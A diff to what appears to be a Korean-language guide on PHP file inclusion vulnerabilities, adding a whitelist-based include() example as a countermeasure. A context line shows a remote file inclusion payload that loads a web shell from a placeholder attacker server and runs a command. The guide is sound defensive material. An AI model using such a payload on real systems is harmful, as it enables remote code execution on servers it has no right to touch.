@@ -73,6 +73,27 @@ http://target.com/index.php?file=http://[ATTACKER_SERVER]/webshell.php?cmd=ls
 
 파일을 include 하는 기능에 서버 내부에서 화이트리스트를 적용하여 특정 파일 이외에는 include 할 수 없도록 검증하여야 한다.
 
+```PHP
+<?php
+    $page = $_GET['page'] ?? 'home';
+
+    // 1. 허용된 파일 목록 정의 (화이트리스트)
+    $allowed_pages = [
+        'home'    => 'pages/home.php',
+        'about'   => 'pages/about.php',
+        'contact' => 'pages/contact.php'
+    ];
+
+    // 2. 입력값이 화이트리스트에 존재하는지 검증
+    if (array_key_exists($page, $allowed_pages)) {
+        include($allowed_pages[$page]);
+    } else {
+        // 안전한 기본 페이지로 이동하거나 에러 처리
+        include('pages/404.php');
+    }
+?>
+```
+
 ## 3.2. 입력값 검증
 
 서버 내부의 다른 파일에 접근하기 위해 필요한 ../ 특수문자와 PHP Wrapper(php://, file:// 등)를 필터링한다. 다만, 해당 문자열들만 필터링할 경우 서버의 소스코드 파일은 보호할 수 없어 완벽한 대응 방안은 아니다.
